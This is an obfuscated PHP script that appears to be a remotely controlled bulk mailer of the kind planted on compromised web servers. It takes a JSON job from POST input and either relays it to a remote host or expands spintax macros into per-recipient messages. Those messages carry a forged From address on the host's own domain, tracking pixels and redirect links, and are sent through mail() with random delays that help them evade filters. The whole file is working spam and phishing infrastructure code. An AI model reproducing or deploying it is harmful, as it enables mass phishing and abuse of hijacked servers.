<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spc7a2bd) { if ($spc7a2bd == 'keys') { return array_keys($this->_keys); } } public function Import($spc7a2bd, $spca83eb) { if (is_array($spca83eb)) { $this->values[$spc7a2bd] = array(); foreach ($spca83eb as $sp6c02a3) { if (!empty($sp6c02a3['key'])) { $this->values[$spc7a2bd][$sp6c02a3['key']] = $sp6c02a3['value']; } else { $this->values[$spc7a2bd][] = $sp6c02a3['value']; } } } else { $this->Assign($spc7a2bd, $spca83eb); } } public function Assign($spc7a2bd, $sp5bd2f3) { $this->values[$spc7a2bd] = $sp5bd2f3; } public function Parse($sp440d4c) { $sp72dd25 = ''; $spda04d1 = 0; while (true) { $spd63c0a = strpos($sp440d4c, '{', $spda04d1); if ($spd63c0a === false) { $sp72dd25 .= substr($sp440d4c, $spda04d1); break; } $sp72dd25 .= substr($sp440d4c, $spda04d1, $spd63c0a - $spda04d1); $spda04d1 = $spd63c0a + 1; $sp1b37e5 = ''; $sp7c5bfb = '{'; $sp46558b = array(); $spe3b600 = false; $sp64e21f = false; $sp39f364 = 'var'; while ($spda04d1 < strlen($sp440d4c)) { $spca3f9c = substr($sp440d4c, $spda04d1, 1); $sp7c5bfb .= $spca3f9c; if ($spca3f9c == ',' || $spca3f9c == '>' || $spca3f9c == '|') { if ($sp39f364 == 'alias') { $spe3b600 = $sp1b37e5; } elseif ($sp39f364 == 'mod') { $sp64e21f = $sp1b37e5; } else { $sp46558b[] = $sp1b37e5; } $sp1b37e5 = ''; if ($spca3f9c == '>') { $sp39f364 = 'alias'; } if ($spca3f9c == '|') { $sp39f364 = 'mod'; } $spda04d1++; continue; } if ($spca3f9c == '}') { if ($sp39f364 == 'alias') { $spe3b600 = $sp1b37e5; } elseif ($sp39f364 == 'mod') { $sp64e21f = $sp1b37e5; } else { $sp46558b[] = $sp1b37e5; } $spda04d1++; break; } $sp1b37e5 .= $spca3f9c; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spca3f9c) == 0) { $spda04d1++; $sp46558b = array(); break; } $spda04d1++; } if (sizeof($sp46558b) == 0) { $sp72dd25 .= $sp7c5bfb; continue; } $sp4a913c = false; $spa55c04 = false; if (preg_match('/^\\^/', $sp46558b[0]) > 0) { $sp46558b[0] = substr($sp46558b[0], 1); $sp4a913c = true; } if (preg_match('/^\\!/', $sp46558b[0]) > 0) { $sp46558b[0] = substr($sp46558b[0], 1); $spa55c04 = true; } $spb770d0 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp46558b[0], $sp486614) > 0) { $spb770d0 = $sp486614[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp46558b[0], $sp486614) > 0) { $spb770d0 = explode('-', $sp486614[1]); } if ($spb770d0 !== false) { $sp46558b[0] = substr($sp46558b[0], 0, strpos($sp46558b[0], '[')); } $this->_keys[$sp46558b[0]] = true; if (empty($this->values[$sp46558b[0]]) && empty($this->fixed[$sp46558b[0]])) { continue; } if ($sp4a913c) { unset($this->fixed[$sp46558b[0]]); } if (isset($this->fixed[$sp46558b[0]])) { $sp79c634 = $this->fixed[$sp46558b[0]]; } else { $sp79c634 = ''; $spe17dc8 = 1; if (sizeof($sp46558b) == 2) { $spe17dc8 = $sp46558b[1]; } if (sizeof($sp46558b) == 3) { $spe17dc8 = rand($sp46558b[1], $sp46558b[2]); } for ($sp34996c = 0; $sp34996c < $spe17dc8; $sp34996c++) { if (is_array($this->values[$sp46558b[0]])) { if (!is_array($this->used[$sp46558b[0]])) { $this->used[$sp46558b[0]] = array(); } if (count($this->used[$sp46558b[0]]) == count($this->values[$sp46558b[0]])) { $this->used[$sp46558b[0]] = array(); } if ($spb770d0 !== false && is_scalar($spb770d0)) { $sp79c634 .= $this->values[$sp46558b[0]][$spb770d0]; $this->used[$spb770d0] = true; } else { $sp989114 = array(); if (is_array($spb770d0)) { $sp324ed2 = $spb770d0[0]; $spdd5525 = $spb770d0[1]; } else { $sp324ed2 = 0; $spdd5525 = count($this->values[$sp46558b[0]]) - 1; } for ($sp9acffb = $sp324ed2; $sp9acffb <= $spdd5525; $sp9acffb++) { if ($spa55c04 && !empty($this->used[$sp46558b[0]][$sp9acffb])) { continue; } $sp989114[] = $sp9acffb; } $sp909b41 = $sp989114[rand(0, count($sp989114) - 1)]; $this->used[$sp46558b[0]][$sp909b41] = true; $sp79c634 .= $this->values[$sp46558b[0]][$sp909b41]; } } else { $sp79c634 .= $this->values[$sp46558b[0]]; } } } $sp79c634 = $this->Parse($sp79c634); if ($sp64e21f !== false) { for ($sp5a56fa = 0; $sp5a56fa < strlen($sp64e21f); $sp5a56fa++) { switch (substr($sp64e21f, $sp5a56fa, 1)) { case 'b': $sp79c634 = base64_encode($sp79c634); break; case 'q': $sp79c634 = quoted_printable_encode($sp79c634); break; default: break; } } } if ($sp4a913c) { $this->fixed[$sp46558b[0]] = $sp79c634; } if ($spe3b600 !== false && $spe3b600 != '') { $this->fixed[$spe3b600] = $sp79c634; } $sp72dd25 .= $sp79c634; } return $sp72dd25; } } $sp518f73 = file_get_contents('php://input'); $sp575276 = json_decode($sp518f73, true); if (empty($sp575276['via_proxy'])) { $sp575276['via_proxy'] = true; $spc6237d = curl_init($sp575276['prefix'] . $sp575276['files']['s']); $spd48088 = json_encode($sp575276); curl_setopt($spc6237d, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spc6237d, CURLOPT_TIMEOUT, 600); curl_setopt($spc6237d, CURLOPT_RETURNTRANSFER, true); curl_setopt($spc6237d, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spc6237d, CURLOPT_REFERER, $sp53fe99); curl_setopt($spc6237d, CURLOPT_POST, true); curl_setopt($spc6237d, CURLOPT_POSTFIELDS, $spd48088); curl_setopt($spc6237d, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spd48088))); $sp5a787b = curl_exec($spc6237d); echo $sp5a787b; die; } $sp0e75f0 = $_SERVER['SERVER_ADDR']; $spdec6f8 = $_SERVER['HTTP_HOST']; $spdec6f8 = preg_replace('/^www\\./', '', $spdec6f8); $spef99ad = new Macros(); $spef99ad->Assign('server_addr', $sp0e75f0); $spef99ad->Assign('server_host', $spdec6f8); foreach ($sp575276['macros'] as $spc7a2bd => $spca83eb) { $spef99ad->Import($spc7a2bd, $spca83eb); } $spf3f77b = preg_replace('/^www\\./i', '', $spdec6f8); $spd02bed = $spef99ad->Parse('{from_user}@' . $spf3f77b); $spef99ad->Assign('from_email', $spd02bed); $spef99ad->Assign('prefix', $sp575276['prefix']); $spef99ad->Assign('html', $sp575276['letter']['html']); $spda04d1 = 0; $spc34388 = 0; $sp037532 = 0; $spa844b1 = array(); foreach ($sp575276['rcpt'] as $sp44b092) { $spef99ad->Assign('email', $sp44b092['email']); $spef99ad->Assign('entry', $sp44b092); $spef99ad->Assign('date', date('r')); $spef99ad->Assign('redirect', $sp575276['prefix'] . $sp575276['files']['r']); $spef99ad->Assign('redirect_with_uri', $sp575276['prefix'] . $sp575276['files']['r'] . '?uri='); $spef99ad->Assign('unsubscribe', $sp575276['prefix'] . $sp575276['files']['u'] . '?id=' . $sp44b092['id']); $spef99ad->Assign('delivery', '<img src="' . $sp575276['prefix'] . $sp575276['files']['d'] . '?id=' . $sp44b092['id'] . '" />'); $spc41574 = $spef99ad->Parse($sp575276['envelope']['header']); $spf80bb0 = $spef99ad->Parse($sp575276['envelope']['body']); if (!empty($sp44b092['name'])) { $sp4c44b7 = $sp44b092['name'] . ' <' . $sp44b092['email'] . '>'; } else { $sp4c44b7 = $sp44b092['email']; } $sp881947 = $spef99ad->Parse($sp575276['letter']['subject']); if ($spda04d1 > 0) { sleep(rand(3, 8)); } $sp8282cc = mail($sp4c44b7, $sp881947, $spf80bb0, $spc41574); $spa844b1[$sp44b092['id']] = $sp8282cc; if ($sp8282cc) { $spc34388++; } else { $sp037532++; } $spda04d1++; } echo serialize(array('total' => count($sp575276['rcpt']), 'sent' => $spda04d1, 'success' => $spc34388, 'error' => $sp037532, 'rcpt' => $spa844b1));